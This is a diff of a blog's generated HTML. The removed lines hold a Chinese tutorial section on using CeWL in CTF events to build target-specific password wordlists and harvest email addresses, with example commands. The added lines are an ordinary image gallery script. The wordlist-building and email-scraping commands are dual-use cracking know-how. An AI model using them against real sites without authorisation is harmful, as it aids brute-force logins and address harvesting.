-<h3 id="CTF中的典型应用场景"><a href="#CTF中的典型应用场景" class="headerlink" title="CTF中的典型应用场景"></a>CTF中的典型应用场景</h3><p>在CTF比赛中，CEWL主要用于：</p>
-<ul>
-<li><p><strong>Web登录爆破</strong>：生成目标网站专属字典，配合Hydra、ffuf等工具破解登录密码</p>
-</li>
-<li><p><strong>密码破解辅助</strong>：为John the Ripper、Hashcat等工具提供针对性字典</p>
-</li>
-<li><p><strong>社会工程学攻击</strong>：提取网站中的品牌名、产品名、员工姓名等信息，构建社工字典</p>
-</li>
-<li><p><strong>特定系统渗透</strong>：针对靶机网站生成符合其内容特点的密码字典，提高爆破成功率</p>
-</li>
-</ul>
-<h3 id="基础使用示例"><a href="#基础使用示例" class="headerlink" title="基础使用示例"></a>基础使用示例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基础用法：爬取目标网站深度为3，生成字典</span></span><br><span class="line">cewl -d 3 -w custom_wordlist.txt https://target-website.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 收集电子邮件地址</span></span><br><span class="line">cewl -e -w emails.txt https://target-website.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置最小单词长度（如5个字符）</span></span><br><span class="line">cewl -m 5 -w long_words.txt https://target-website.com</span><br></pre></td></tr></table></figure>
-
-<h3 id="为什么在CTF中重要"><a href="#为什么在CTF中重要" class="headerlink" title="为什么在CTF中重要"></a>为什么在CTF中重要</h3><p>CTF题目中的密码往往与目标系统&#x2F;网站内容相关，使用通用字典（如rockyou.txt）可能效率低下，而CEWL生成的<strong>目标专属字典</strong>能显著提高密码破解成功率，是渗透测试人员必备工具之一。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1601,6 +1546,561 @@
 </div>
 
 
+<div class="saber-gallery motion-element">
+  <div class="saber-gallery-container" id="saberGallery">
+    <div class="saber-gallery-track">
+      <img class="saber-gallery-img" src="/images/blue_saber.png" alt="Blue Saber" data-index="0">
+      <img class="saber-gallery-img" src="/images/daily_saber.png" alt="Daily Saber" data-index="1">
+      <img class="saber-gallery-img" src="/images/dark_saber.png" alt="Dark Saber" data-index="2">
+    </div>
+    <button class="saber-gallery-arrow saber-gallery-prev" id="saberPrev" aria-label="上一张">
+      <i class="fa fa-chevron-left"></i>
+    </button>
+    <button class="saber-gallery-arrow saber-gallery-next" id="saberNext" aria-label="下一张">
+      <i class="fa fa-chevron-right"></i>
+    </button>
+    <div class="saber-gallery-dots">
+      <span class="saber-gallery-dot active"></span>
+      <span class="saber-gallery-dot"></span>
+      <span class="saber-gallery-dot"></span>
+    </div>
+  </div>
+</div>
+
+<div class="saber-lightbox" id="saberLightbox">
+  <div class="saber-lightbox-overlay"></div>
+  <button class="saber-lightbox-close" id="saberLightboxClose" aria-label="关闭">
+    <i class="fa fa-times"></i>
+  </button>
+  <button class="saber-lightbox-arrow saber-lightbox-prev" id="saberLightboxPrev" aria-label="上一张">
+    <i class="fa fa-chevron-left"></i>
+  </button>
+  <button class="saber-lightbox-arrow saber-lightbox-next" id="saberLightboxNext" aria-label="下一张">
+    <i class="fa fa-chevron-right"></i>
+  </button>
+  <div class="saber-lightbox-content">
+    <img class="saber-lightbox-img" id="saberLightboxImg" src="" alt="">
+  </div>
+  <div class="saber-lightbox-counter" id="saberLightboxCounter"></div>
+</div>
+
+<style>
+.saber-gallery {
+  margin-top: 15px;
+  text-align: center;
+}
+.saber-gallery-container {
+  position: relative;
+  width: 100%;
+  height: 280px;
+  overflow: hidden;
+  border-radius: 8px;
+  cursor: pointer;
+  user-select: none;
+  -webkit-user-select: none;
+}
+.saber-gallery-container:active {
+  cursor: pointer;
+}
+.saber-gallery-track {
+  display: flex;
+  height: 100%;
+  transition: transform 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+  will-change: transform;
+}
+.saber-gallery-img {
+  flex-shrink: 0;
+  width: 100%;
+  height: 100%;
+  object-fit: contain;
+  object-position: center;
+  pointer-events: none;
+}
+.saber-gallery-arrow {
+  position: absolute;
+  top: 50%;
+  transform: translateY(-50%);
+  width: 32px;
+  height: 32px;
+  border: none;
+  border-radius: 50%;
+  background: rgba(0, 0, 0, 0.4);
+  color: #fff;
+  font-size: 14px;
+  cursor: pointer;
+  opacity: 0;
+  transition: opacity 0.3s ease, background 0.3s ease;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 2;
+}
+.saber-gallery-container:hover .saber-gallery-arrow {
+  opacity: 1;
+}
+.saber-gallery-arrow:hover {
+  background: rgba(0, 0, 0, 0.7);
+}
+.saber-gallery-arrow.disabled {
+  opacity: 0.2 !important;
+  cursor: not-allowed;
+}
+.saber-gallery-prev {
+  left: 8px;
+}
+.saber-gallery-next {
+  right: 8px;
+}
+.saber-gallery-dots {
+  position: absolute;
+  bottom: 10px;
+  left: 50%;
+  transform: translateX(-50%);
+  display: flex;
+  gap: 6px;
+  z-index: 2;
+}
+.saber-gallery-dot {
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  background: rgba(255, 255, 255, 0.5);
+  transition: background 0.3s ease, transform 0.3s ease;
+  cursor: pointer;
+}
+.saber-gallery-dot.active {
+  background: rgba(255, 255, 255, 0.95);
+  transform: scale(1.3);
+}
+
+/* Lightbox Styles */
+.saber-lightbox {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  z-index: 9999;
+  display: none;
+  opacity: 0;
+  transition: opacity 0.3s ease;
+}
+.saber-lightbox.active {
+  display: flex;
+  opacity: 1;
+}
+.saber-lightbox-overlay {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0, 0, 0, 0.92);
+  cursor: pointer;
+}
+.saber-lightbox-content {
+  position: relative;
+  z-index: 2;
+  margin: auto;
+  max-width: 90vw;
+  max-height: 90vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.saber-lightbox-img {
+  max-width: 100%;
+  max-height: 90vh;
+  object-fit: contain;
+  border-radius: 4px;
+  transform: scale(0.8);
+  transition: transform 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+}
+.saber-lightbox.active .saber-lightbox-img {
+  transform: scale(1);
+}
+.saber-lightbox-close {
+  position: absolute;
+  top: 20px;
+  right: 30px;
+  width: 40px;
+  height: 40px;
+  border: none;
+  border-radius: 50%;
+  background: rgba(255, 255, 255, 0.15);
+  color: #fff;
+  font-size: 18px;
+  cursor: pointer;
+  z-index: 3;
+  transition: background 0.3s ease, transform 0.3s ease;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.saber-lightbox-close:hover {
+  background: rgba(255, 255, 255, 0.3);
+  transform: rotate(90deg);
+}
+.saber-lightbox-arrow {
+  position: absolute;
+  top: 50%;
+  transform: translateY(-50%);
+  width: 50px;
+  height: 50px;
+  border: none;
+  border-radius: 50%;
+  background: rgba(255, 255, 255, 0.15);
+  color: #fff;
+  font-size: 20px;
+  cursor: pointer;
+  z-index: 3;
+  transition: background 0.3s ease, opacity 0.3s ease;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.saber-lightbox-arrow:hover {
+  background: rgba(255, 255, 255, 0.3);
+}
+.saber-lightbox-arrow.disabled {
+  opacity: 0.2;
+  cursor: not-allowed;
+}
+.saber-lightbox-prev {
+  left: 20px;
+}
+.saber-lightbox-next {
+  right: 20px;
+}
+.saber-lightbox-counter {
+  position: absolute;
+  bottom: 20px;
+  left: 50%;
+  transform: translateX(-50%);
+  color: rgba(255, 255, 255, 0.8);
+  font-size: 14px;
+  z-index: 3;
+  letter-spacing: 2px;
+}
+
+@media (max-width: 768px) {
+  .saber-lightbox-arrow {
+    width: 40px;
+    height: 40px;
+    font-size: 16px;
+  }
+  .saber-lightbox-prev {
+    left: 10px;
+  }
+  .saber-lightbox-next {
+    right: 10px;
+  }
+  .saber-lightbox-close {
+    top: 10px;
+    right: 15px;
+    width: 36px;
+    height: 36px;
+    font-size: 16px;
+  }
+}
+</style>
+
+<script>
+(function() {
+  // Gallery Logic
+  var container = document.getElementById('saberGallery');
+  var track = container.querySelector('.saber-gallery-track');
+  var images = container.querySelectorAll('.saber-gallery-img');
+  var dots = container.querySelectorAll('.saber-gallery-dot');
+  var prevBtn = document.getElementById('saberPrev');
+  var nextBtn = document.getElementById('saberNext');
+  var current = 0;
+  var total = images.length;
+  var autoInterval = 15000;
+  var timer = null;
+
+  function goTo(index) {
+    if (index < 0) index = 0;
+    if (index >= total) index = total - 1;
+    current = index;
+    track.style.transform = 'translateX(-' + (current * 100) + '%)';
+    dots.forEach(function(dot, i) {
+      dot.classList.toggle('active', i === current);
+    });
+    updateArrows();
+  }
+
+  function updateArrows() {
+    prevBtn.classList.toggle('disabled', current === 0);
+    nextBtn.classList.toggle('disabled', current === total - 1);
+  }
+
+  function next() {
+    if (current < total - 1) {
+      goTo(current + 1);
+    }
+  }
+
+  function prev() {
+    if (current > 0) {
+      goTo(current - 1);
+    }
+  }
+
+  function startAuto() {
+    timer = setInterval(function() {
+      if (current < total - 1) {
+        goTo(current + 1);
+      } else {
+        goTo(0);
+      }
+    }, autoInterval);
+  }
+
+  function stopAuto() {
+    clearInterval(timer);
+  }
+
+  prevBtn.addEventListener('click', function(e) {
+    e.stopPropagation();
+    stopAuto();
+    prev();
+    startAuto();
+  });
+
+  nextBtn.addEventListener('click', function(e) {
+    e.stopPropagation();
+    stopAuto();
+    next();
+    startAuto();
+  });
+
+  dots.forEach(function(dot, i) {
+    dot.addEventListener('click', function(e) {
+      e.stopPropagation();
+      stopAuto();
+      goTo(i);
+      startAuto();
+    });
+  });
+
+  // Touch swipe support
+  var startX = 0;
+  var startY = 0;
+  var isDragging = false;
+  var currentTranslate = 0;
+  var prevTranslate = 0;
+
+  container.addEventListener('touchstart', function(e) {
+    startX = e.touches[0].clientX;
+    startY = e.touches[0].clientY;
+    isDragging = true;
+    stopAuto();
+    track.style.transition = 'none';
+  }, { passive: true });
+
+  container.addEventListener('touchmove', function(e) {
+    if (!isDragging) return;
+    var diffX = e.touches[0].clientX - startX;
+    var diffY = e.touches[0].clientY - startY;
+    if (Math.abs(diffX) > Math.abs(diffY)) {
+      currentTranslate = prevTranslate + diffX;
+      track.style.transform = 'translateX(' + currentTranslate + 'px)';
+    }
+  }, { passive: true });
+
+  container.addEventListener('touchend', function(e) {
+    if (!isDragging) return;
+    isDragging = false;
+    track.style.transition = 'transform 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94)';
+    var diffX = e.changedTouches[0].clientX - startX;
+    if (Math.abs(diffX) > 50) {
+      if (diffX > 0 && current > 0) {
+        prev();
+      } else if (diffX < 0 && current < total - 1) {
+        next();
+      } else {
+        goTo(current);
+      }
+    } else {
+      goTo(current);
+    }
+    prevTranslate = -(current * container.offsetWidth);
+    startAuto();
+  });
+
+  // Mouse drag support
+  var mouseDown = false;
+  container.addEventListener('mousedown', function(e) {
+    mouseDown = true;
+    startX = e.clientX;
+    stopAuto();
+    track.style.transition = 'none';
+    e.preventDefault();
+  });
+
+  container.addEventListener('mousemove', function(e) {
+    if (!mouseDown) return;
+    var diffX = e.clientX - startX;
+    currentTranslate = prevTranslate + diffX;
+    track.style.transform = 'translateX(' + currentTranslate + 'px)';
+  });
+
+  container.addEventListener('mouseup', function(e) {
+    if (!mouseDown) return;
+    mouseDown = false;
+    track.style.transition = 'transform 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94)';
+    var diffX = e.clientX - startX;
+    if (Math.abs(diffX) > 50) {
+      if (diffX > 0 && current > 0) {
+        prev();
+      } else if (diffX < 0 && current < total - 1) {
+        next();
+      } else {
+        goTo(current);
+      }
+    } else {
+      goTo(current);
+    }
+    prevTranslate = -(current * container.offsetWidth);
+    startAuto();
+  });
+
+  container.addEventListener('mouseleave', function() {
+    if (mouseDown) {
+      mouseDown = false;
+      track.style.transition = 'transform 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94)';
+      goTo(current);
+      prevTranslate = -(current * container.offsetWidth);
+      startAuto();
+    }
+  });
+
+  window.addEventListener('resize', function() {
+    prevTranslate = -(current * container.offsetWidth);
+  });
+
+  // Lightbox Logic
+  var lightbox = document.getElementById('saberLightbox');
+  var lightboxImg = document.getElementById('saberLightboxImg');
+  var lightboxClose = document.getElementById('saberLightboxClose');
+  var lightboxPrevBtn = document.getElementById('saberLightboxPrev');
+  var lightboxNextBtn = document.getElementById('saberLightboxNext');
+  var lightboxCounter = document.getElementById('saberLightboxCounter');
+  var lightboxOverlay = lightbox.querySelector('.saber-lightbox-overlay');
+  var lightboxCurrent = 0;
+  var imgSources = Array.from(images).map(function(img) { return img.src; });
+
+  function openLightbox(index) {
+    lightboxCurrent = index;
+    lightboxImg.src = imgSources[lightboxCurrent];
+    updateLightboxCounter();
+    updateLightboxArrows();
+    lightbox.style.display = 'flex';
+    document.body.style.overflow = 'hidden';
+    // Force reflow
+    lightbox.offsetHeight;
+    lightbox.classList.add('active');
+    stopAuto();
+  }
+
+  function closeLightbox() {
+    lightbox.classList.remove('active');
+    document.body.style.overflow = '';
+    setTimeout(function() {
+      lightbox.style.display = 'none';
+      lightboxImg.src = '';
+      startAuto();
+    }, 300);
+  }
+
+  function updateLightboxCounter() {
+    lightboxCounter.textContent = (lightboxCurrent + 1) + ' / ' + total;
+  }
+
+  function updateLightboxArrows() {
+    lightboxPrevBtn.classList.toggle('disabled', lightboxCurrent === 0);
+    lightboxNextBtn.classList.toggle('disabled', lightboxCurrent === total - 1);
+  }
+
+  function lightboxGoTo(index) {
+    if (index < 0 || index >= total) return;
+    lightboxCurrent = index;
+    lightboxImg.style.opacity = '0.5';
+    setTimeout(function() {
+      lightboxImg.src = imgSources[lightboxCurrent];
+      lightboxImg.style.opacity = '1';
+      updateLightboxCounter();
+      updateLightboxArrows();
+    }, 150);
+  }
+
+  function lightboxNext() {
+    if (lightboxCurrent < total - 1) {
+      lightboxGoTo(lightboxCurrent + 1);
+    }
+  }
+
+  function lightboxPrev() {
+    if (lightboxCurrent > 0) {
+      lightboxGoTo(lightboxCurrent - 1);
+    }
+  }
+
+  // Click on gallery image to open lightbox
+  container.addEventListener('click', function(e) {
+    if (e.target.closest('.saber-gallery-arrow') || e.target.closest('.saber-gallery-dots')) return;
+    openLightbox(current);
+  });
+
+  lightboxClose.addEventListener('click', closeLightbox);
+  lightboxOverlay.addEventListener('click', closeLightbox);
+
+  lightboxPrevBtn.addEventListener('click', function(e) {
+    e.stopPropagation();
+    lightboxPrev();
+  });
+
+  lightboxNextBtn.addEventListener('click', function(e) {
+    e.stopPropagation();
+    lightboxNext();
+  });
+
+  // Keyboard navigation
+  document.addEventListener('keydown', function(e) {
+    if (!lightbox.classList.contains('active')) return;
+    if (e.key === 'Escape') {
+      closeLightbox();
+    } else if (e.key === 'ArrowLeft') {
+      lightboxPrev();
+    } else if (e.key === 'ArrowRight') {
+      lightboxNext();
+    }
+  });
+
+  // Swipe in lightbox
+  var lbStartX = 0;
+  lightbox.addEventListener('touchstart', function(e) {
+    lbStartX = e.touches[0].clientX;
+  }, { passive: true });
+
+  lightbox.addEventListener('touchend', function(e) {
+    var diffX = e.changedTouches[0].clientX - lbStartX;
+    if (Math.abs(diffX) > 80) {
+      if (diffX > 0) {
+        lightboxPrev();
+      } else {
+        lightboxNext();
+      }
+    }
+  }, { passive: true });
+
+  // Initialize
+  prevTranslate = 0;
+  updateArrows();
+  startAuto();
+})();
+</script>
 
       </div>
 
